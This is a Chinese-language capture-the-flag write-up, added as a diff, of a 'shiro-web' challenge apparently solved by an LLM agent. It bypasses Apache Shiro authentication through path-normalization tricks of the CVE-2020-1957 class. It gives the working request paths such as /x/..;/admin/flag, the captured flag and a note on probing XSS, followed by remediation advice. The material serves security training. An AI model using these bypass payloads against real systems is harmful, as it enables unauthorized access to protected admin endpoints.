@@ -1,0 +1,45 @@
+# shiro-web · 渗透记录
+
+## 2.1 基本信息
+| 字段 | 内容 |
+|---|---|
+| 题目 | shiro-web |
+| 类型 | Web / Shiro 路径归一化鉴权绕过（CVE-2020-1957 类） |
+| 入口 | http://kudxmerczf9yq7ov.neu-nex.fun |
+| 耗时 | 0 日 0 时 1 分 34 秒 |
+| LLM | deepseek-flash |
+| flag | `nex{teAm_5pIrIt_sH1r0_nn0dvbkr}` |
+
+## 2.2 目标与授权
+- 授权范围：仅题目域名 80 端口；未爆破 key、未向靶机落 webshell；留言板只投递探测性 XSS（payload 会留在 board，无删除接口）
+- 禁止动作：DoS、横向移动、持久化、读取无关数据
+
+## 2.3 侦察与指纹
+Cookie rememberMe=deleteMe（Shiro 存在）；/admin、/admin/flag 均 302 到 /login;jsessionid=...，而 /login 本身 404（无登录页）；首页是留言板：/submit?msg= 写入、/api/messages 读列表、/report 触发“管理员查看”
+
+## 2.4 攻击面
+1) /admin/flag（Shiro authc 保护）2) 路径归一化变体（/x/..;/、/;/、/.;/）3) 留言板 /submit + /report（存储型 XSS 入口，红鲱鱼）
+
+## 2.5 漏洞判定
+- 类型：Web / Shiro 路径归一化鉴权绕过（CVE-2020-1957 类）
+- 位置：/x/..;/admin/flag
+- 证据：evidence/step1_resp.txt（直连 /admin/flag 302 + JSESSIONID）；step2_resp.txt（/x/..;/admin/flag 200 + flag）；step3_resp.txt（/;/admin/flag 200 同 flag）；step3b_resp.txt（/.;/admin/flag 200 同 flag）；step4_messages.json（XSS 红鲱鱼记录）
+- 误报排除：直连 302 但三种不同归一化变体都 200 且 body 为 flag 原文，互相独立；不是缓存/跳过鉴权的假象（302 与 200 在同一会话下对比）。XSS 路线：bot 只带回 document.cookie=<REDACTED> 自身 fetch /admin/flag 仍是 302->/login 404，证明 XSS 不足、不是本题解
+
+## 2.6 利用链
+```
+GET /admin/flag                     -> 302 Location: /login;jsessionid=...（被 authc 拦）
+GET /x/..;/admin/flag                -> 200 nex{teAm_5pIrIt_sH1r0_nn0dvbkr}
+GET /;/admin/flag                    -> 200 同一 flag（独立变体）
+GET /.;/admin/flag                   -> 200 同一 flag（独立变体）
+原理：Shiro 用原始 URI 匹配过滤器链，容器/Spring 之后才做路径归一化 -> /x/..;/admin/flag 归一化后落到 /admin/flag 但过滤器按 /x/..; 放行
+```
+
+## 2.7 影响
+未授权访问管理员接口并读取 flag；同类配置下可扩大为整个 /admin/* 面
+
+## 2.8 修复建议
+升级 Shiro 到修复版本；在网关/反向代理层先做 URI 规范化并拒绝含 ;/.. 的路径；鉴权放在归一化之后；不要在 shiro 过滤器链里用未归一化的 requestURI 匹配
+
+## 2.9 复盘
+留言板 XSS 是烟雾弹，bot 无管理员会话；直接跑路径矩阵 /x/..;/admin/flag 秒出 flag。
